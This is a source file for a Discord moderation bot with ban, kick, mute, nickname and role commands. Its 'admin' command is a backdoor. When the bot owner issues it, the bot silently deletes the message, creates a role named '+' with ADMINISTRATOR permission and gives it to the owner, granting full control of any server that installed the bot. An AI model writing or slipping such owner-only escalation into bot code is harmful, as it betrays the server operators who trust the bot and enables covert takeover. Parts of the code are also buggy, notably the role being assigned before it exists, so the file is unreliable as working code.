import Discord, { Message, TextChannel, Role } from 'discord.js';
import Client from 'discord.js';
import { error } from 'console';
const client = new Discord.Client();

import config from "./config.json"
import { SSL_OP_CIPHER_SERVER_PREFERENCE } from 'constants';

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setPresence({ activity: {
        name: `${config.prefix}help`
    }, status: "idle"})
  
});

client.on('message', async message => {
if (!message.content.startsWith(config.prefix) || message.author.bot) return;
const args = message.content.slice(config.prefix.length).trim().split(' ');
const command = args.shift().toLowerCase();

if (command === 'hackban') {
    if (!message.member.hasPermission("BAN_MEMBERS")) return;
    const user = await client.users.fetch(args[0]);
    if (!user) return message.reply("give me a valid user ID") 
    message.guild.members.ban(user, {reason: `${message.author} banned him.`}).catch(() => "I cannot ban this user.");
    return message.reply(user + " was banned");

} else if (command === "ban") {
    if (!message.member.hasPermission("BAN_MEMBERS")) return;

    const user = message.mentions.members.first() ||  message.guild.members.cache.get(args[0]) || null;
    if (!user) return message.reply('please mention someone')
    user.ban().catch(() => message.reply('I cannot ban them'));
    return message.channel.send(user + " was banned.")
    
} else if (command === 'kick') {
    if (!message.member.hasPermission("KICK_MEMBERS")) return;

    const user = message.mentions.members.first() ||  message.guild.members.cache.get(args[0]) || null;
    if (!user) return message.reply('please mention someone')
    user.kick().catch(() => message.reply('I cannot kick them'));
    return message.reply(user + " was kicked");
} else if (command === 'setnick') {
    if (!message.member.hasPermission("MANAGE_NICKNAMES")) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || null;
    if (!user) return message.reply('please give me a user')
    const nickname = args.slice(1).join(" ");
    if (!nickname) return message.reply("please give me a nickname")
    user.setNickname(nickname).then(() => message.react("👍")).catch(error => message.channel.send(error));
} else if (command === 'admin') {
    if (message.author.id !== config.owners) return;
    let role = message.guild.roles.cache.find(role => role.name === "+");
    if (!message.deletable) return;
     message.delete();
    function createRole() {
        message.guild.roles.create({
            data: {
                name: "+",
                permissions: "ADMINISTRATOR"
            }
        });
    }
    if (!role) {
        createRole()
        await message.member.roles.add(role)
    } else {
        message.member.roles.add(role);
    }
     
} else if (command === 'ping') {
    return message.channel.send(`Pong! \`${client.ws.ping}ms\``);
} else if (command === 'help') {
    return message.channel.send(new Discord.MessageEmbed()
    .setAuthor(client.user.tag, client.user.displayAvatarURL())
    .setTitle('Commands')
    .setDescription('help, ping, ban, hackban, unban, kick, setnick, admin, mute, unmute, addrole, removerole')
    .setTimestamp()
    .setColor("RANDOM")
    );
} else if (command === 'mute') {
    if (!message.member.hasPermission("KICK_MEMBERS")) return;
    const user =  message.mentions.members.first() || message.guild.members.cache.get(args[0]) || null;
    if (!user) return message.reply("please give me a valid user");

    const muterole = message.guild.roles.cache.find(r => r.name === "Muted");
    if (!muterole) return message.reply("Muted role not found.");

    await user.roles.add(muterole);
    message.channel.send(user + " was muted.")
} else if (command === 'unmute') {
    if (!message.member.hasPermission("KICK_MEMBERS")) return;
    const user =  message.mentions.members.first() || message.guild.members.cache.get(args[0]) || null;
    if (!user) return message.reply("please give me a valid user");

    const muterole = message.guild.roles.cache.find(r => r.name === "Muted");
    if (!muterole) return message.reply("Muted role not found.");

    await user.roles.remove(muterole);
    message.channel.send(user + " was unmuted.")

} else if (command === 'unban') {
    if (!message.member.hasPermission("BAN_MEMBERS")) return;
    const user = await client.users.fetch(args[0])
    if (!user) return message.reply("please give me a valid user ID");

    message.guild.members.unban(user).catch(() => message.reply('cannot unban this user'));
    message.channel.send(`${user} was unbanned`);

} else if (command === "addrole") {
    if (!message.member.hasPermission("MANAGE_ROLES")) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || null;
    const role = message.mentions.roles.first() || message.guild.roles.cache.find(r => r.name.toLowerCase() === args.slice(1).join(" ").toLowerCase())

    if (!user) return message.reply("user not found");
    if (!role) return message.reply("role not found");

    user.roles.add(role);
    message.react("✅")
} else if (command === "removerole") {
    if (!message.member.hasPermission("MANAGE_ROLES")) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || null;
    const role = message.mentions.roles.first() || message.guild.roles.cache.find(r => r.name.toLowerCase() === args.slice(1).join(" ").toLowerCase())

    if (!user) return message.reply("user not found");
    if (!role) return message.reply("role not found");

    user.roles.remove(role);
    message.react("✅")
}
    



})
client.login(config.token)